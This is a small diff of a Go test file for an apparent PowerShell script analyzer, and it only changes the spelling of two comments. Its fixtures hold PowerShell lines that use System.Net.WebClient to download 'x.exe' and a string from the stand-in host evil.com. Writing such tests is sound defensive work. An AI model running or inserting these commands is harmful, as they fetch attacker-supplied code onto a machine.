@@ -1806,7 +1806,7 @@ func TestPSWorker_NewObjectNamedTypeName(t *testing.T) {
 	defer w.stop()
 
 	t.Run("variable form: $wc = New-Object -TypeName ... ; $wc.Method()", func(t *testing.T) {
-		// BUG: fails before fix — named -TypeName parameter not recognised by instance-method walker.
+		// BUG: fails before fix — named -TypeName parameter not recognized by instance-method walker.
 		const script = `$wc = New-Object -TypeName System.Net.WebClient
 $wc.DownloadFile("http://evil.com/x.exe", "C:\tmp\x.exe")`
 		resp, err := w.parse(script)
@@ -1835,7 +1835,7 @@ $wc.DownloadFile("http://evil.com/x.exe", "C:\tmp\x.exe")`
 	})
 
 	t.Run("inline form: (New-Object -TypeName ...).Method()", func(t *testing.T) {
-		// BUG: fails before fix — named -TypeName parameter not recognised by instance-method walker.
+		// BUG: fails before fix — named -TypeName parameter not recognized by instance-method walker.
 		const script = `(New-Object -TypeName System.Net.WebClient).DownloadString("http://evil.com")`
 		resp, err := w.parse(script)
 		if err != nil {
